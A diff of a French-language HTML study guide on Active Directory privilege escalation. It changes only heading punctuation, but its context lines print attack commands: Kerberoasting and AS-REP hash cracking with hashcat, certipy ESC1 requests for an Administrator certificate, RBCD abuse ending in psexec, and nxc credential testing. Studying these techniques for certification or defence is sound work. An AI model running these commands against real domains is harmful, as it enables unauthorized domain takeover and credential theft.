@@ -813,12 +813,12 @@
   <a href="#41-kerberoasting" class="md-nav__link">
     <span class="md-ellipsis">
       
-        4.1 — Kerberoasting
+        4.1 : Kerberoasting
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="4.1 — Kerberoasting">
+    <nav class="md-nav" aria-label="4.1 : Kerberoasting">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -841,12 +841,12 @@
   <a href="#42-as-rep-roasting" class="md-nav__link">
     <span class="md-ellipsis">
       
-        4.2 — AS-REP Roasting
+        4.2 : AS-REP Roasting
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="4.2 — AS-REP Roasting">
+    <nav class="md-nav" aria-label="4.2 : AS-REP Roasting">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -869,12 +869,12 @@
   <a href="#43-abus-des-acl-access-control-lists" class="md-nav__link">
     <span class="md-ellipsis">
       
-        4.3 — Abus des ACL (Access Control Lists)
+        4.3 : Abus des ACL (Access Control Lists)
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="4.3 — Abus des ACL (Access Control Lists)">
+    <nav class="md-nav" aria-label="4.3 : Abus des ACL (Access Control Lists)">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -974,7 +974,7 @@
   <a href="#44-adcs-abus-de-templates-vulnerables" class="md-nav__link">
     <span class="md-ellipsis">
       
-        4.4 — ADCS — Abus de templates vulnérables
+        4.4 : ADCS : Abus de templates vulnérables
       
     </span>
   </a>
@@ -985,7 +985,7 @@
   <a href="#45-rbcd-resource-based-constrained-delegation" class="md-nav__link">
     <span class="md-ellipsis">
       
-        4.5 — RBCD (Resource-Based Constrained Delegation)
+        4.5 : RBCD (Resource-Based Constrained Delegation)
       
     </span>
   </a>
@@ -996,7 +996,7 @@
   <a href="#46-apres-le-crack-tester-et-continuer" class="md-nav__link">
     <span class="md-ellipsis">
       
-        4.6 — Après le crack : tester et continuer
+        4.6 : Après le crack : tester et continuer
       
     </span>
   </a>
@@ -1569,7 +1569,7 @@
   
 
 
-<h1 id="phase-4-escalade-de-privileges">Phase 4 — Escalade de Privilèges<a class="headerlink" href="#phase-4-escalade-de-privileges" title="Permanent link">&para;</a></h1>
+<h1 id="phase-4-escalade-de-privileges">Phase 4 : Escalade de Privilèges<a class="headerlink" href="#phase-4-escalade-de-privileges" title="Permanent link">&para;</a></h1>
 <p>Tu as un compte lambda. Tu veux devenir <strong>Domain Admin</strong>. Voici les techniques principales.</p>
 <div class="admonition tip">
 <p class="admonition-title">Règle d'or</p>
@@ -1595,7 +1595,7 @@
 </span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>            → Voir [Kerberos](../fondamentaux/kerberos.md)
 </span></code></pre></div>
 <hr />
-<h2 id="41-kerberoasting">4.1 — Kerberoasting<a class="headerlink" href="#41-kerberoasting" title="Permanent link">&para;</a></h2>
+<h2 id="41-kerberoasting">4.1 : Kerberoasting<a class="headerlink" href="#41-kerberoasting" title="Permanent link">&para;</a></h2>
 <h3 id="le-concept">Le concept<a class="headerlink" href="#le-concept" title="Permanent link">&para;</a></h3>
 <p>N'importe quel utilisateur du domaine peut demander un <strong>ticket Kerberos</strong> pour n'importe quel compte de service. Ce ticket est <strong>chiffré avec le hash du compte de service</strong>. On peut le cracker offline.</p>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>1. On liste les comptes avec un SPN (Service Principal Name)
@@ -1621,7 +1621,7 @@
 </span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>~/certif/hashes/kerberoast.hash<span class="w"> </span><span class="se">\</span>
 </span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">    </span>/usr/share/wordlists/rockyou.txt
 </span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="c1"># Avec règles (recommandé — les mots de passe service sont souvent complexes)</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="c1"># Avec règles (recommandé : les mots de passe service sont souvent complexes)</span>
 </span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>~/certif/hashes/kerberoast.hash<span class="w"> </span><span class="se">\</span>
 </span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="w">    </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span><span class="se">\</span>
 </span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="w">    </span>-r<span class="w"> </span>/usr/share/hashcat/rules/best64.rule
@@ -1636,7 +1636,7 @@
 <p>Ça marche uniquement si le compte de service a un <strong>mot de passe faible</strong>. Les comptes gérés automatiquement (<strong>gMSA</strong>) sont immunisés.</p>
 </div>
 <hr />
-<h2 id="42-as-rep-roasting">4.2 — AS-REP Roasting<a class="headerlink" href="#42-as-rep-roasting" title="Permanent link">&para;</a></h2>
+<h2 id="42-as-rep-roasting">4.2 : AS-REP Roasting<a class="headerlink" href="#42-as-rep-roasting" title="Permanent link">&para;</a></h2>
 <h3 id="le-concept_1">Le concept<a class="headerlink" href="#le-concept_1" title="Permanent link">&para;</a></h3>
 <p>Normalement, Kerberos exige une <strong>pré-authentification</strong> : le client prouve qu'il connaît son mot de passe avant de recevoir un ticket. Mais si cette option est désactivée sur un compte, n'importe qui peut demander un ticket AS-REP pour ce compte, <strong>sans mot de passe</strong>.</p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># Trouver les comptes vulnérables et récupérer les hashes</span>
@@ -1653,7 +1653,7 @@
 </span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="w">    </span>~/certif/hashes/asrep.hash
 </span></code></pre></div>
 <hr />
-<h2 id="43-abus-des-acl-access-control-lists">4.3 — Abus des ACL (Access Control Lists)<a class="headerlink" href="#43-abus-des-acl-access-control-lists" title="Permanent link">&para;</a></h2>
+<h2 id="43-abus-des-acl-access-control-lists">4.3 : Abus des ACL (Access Control Lists)<a class="headerlink" href="#43-abus-des-acl-access-control-lists" title="Permanent link">&para;</a></h2>
 <p>Les mauvaises configurations d'ACL créent des chemins d'escalade.
 <strong>BloodHound</strong> détecte ces chemins automatiquement dans l'onglet "Outbound Object Control".</p>
 <h3 id="droits-dangereux">Droits dangereux<a class="headerlink" href="#droits-dangereux" title="Permanent link">&para;</a></h3>
@@ -1731,12 +1731,12 @@
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>targetedKerberoast.py<span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN_FQDN</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="nv">$PWD</span><span class="w"> </span>--dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
 </span></code></pre></div>
 <hr />
-<h2 id="44-adcs-abus-de-templates-vulnerables">4.4 — ADCS — Abus de templates vulnérables<a class="headerlink" href="#44-adcs-abus-de-templates-vulnerables" title="Permanent link">&para;</a></h2>
+<h2 id="44-adcs-abus-de-templates-vulnerables">4.4 : ADCS : Abus de templates vulnérables<a class="headerlink" href="#44-adcs-abus-de-templates-vulnerables" title="Permanent link">&para;</a></h2>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1"># Énumérer les templates vulnérables</span>
 </span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>certipy<span class="w"> </span>find<span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span>@<span class="nv">$DOMAIN_FQDN</span><span class="w"> </span>-p<span class="w"> </span><span class="nv">$PWD</span><span class="w"> </span><span class="se">\</span>
 </span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="w">    </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-vulnerable<span class="w"> </span>-stdout
 </span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>
-</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="c1"># ESC1 — Demander un certificat pour Administrator</span>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="c1"># ESC1 : Demander un certificat pour Administrator</span>
 </span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>certipy<span class="w"> </span>req<span class="w"> </span><span class="se">\</span>
 </span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="w">    </span>-u<span class="w"> </span><span class="nv">$USER</span>@<span class="nv">$DOMAIN_FQDN</span><span class="w"> </span>-p<span class="w"> </span><span class="nv">$PWD</span><span class="w"> </span><span class="se">\</span>
 </span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="w">    </span>-target<span class="w"> </span><span class="nv">$CA_SERVER</span><span class="w"> </span><span class="se">\</span>
@@ -1748,7 +1748,7 @@
 </span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>certipy<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>administrator.pfx<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
 </span></code></pre></div>
 <hr />
-<h2 id="45-rbcd-resource-based-constrained-delegation">4.5 — RBCD (Resource-Based Constrained Delegation)<a class="headerlink" href="#45-rbcd-resource-based-constrained-delegation" title="Permanent link">&para;</a></h2>
+<h2 id="45-rbcd-resource-based-constrained-delegation">4.5 : RBCD (Resource-Based Constrained Delegation)<a class="headerlink" href="#45-rbcd-resource-based-constrained-delegation" title="Permanent link">&para;</a></h2>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># Prérequis : avoir GenericWrite sur une machine cible</span>
 </span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>
 </span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="c1"># 1. Créer un compte machine</span>
@@ -1768,7 +1768,7 @@
 </span><span id="__span-13-17"><a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a>psexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>target.entreprise.local
 </span></code></pre></div>
 <hr />
-<h2 id="46-apres-le-crack-tester-et-continuer">4.6 — Après le crack : tester et continuer<a class="headerlink" href="#46-apres-le-crack-tester-et-continuer" title="Permanent link">&para;</a></h2>
+<h2 id="46-apres-le-crack-tester-et-continuer">4.6 : Après le crack : tester et continuer<a class="headerlink" href="#46-apres-le-crack-tester-et-continuer" title="Permanent link">&para;</a></h2>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1"># Tester les nouveaux credentials</span>
 </span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$PRIV_USER</span><span class="w"> </span>-p<span class="w"> </span><span class="nv">$PRIV_PWD</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--continue-on-success
 </span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$PRIV_USER</span><span class="w"> </span>-p<span class="w"> </span><span class="nv">$PRIV_PWD</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
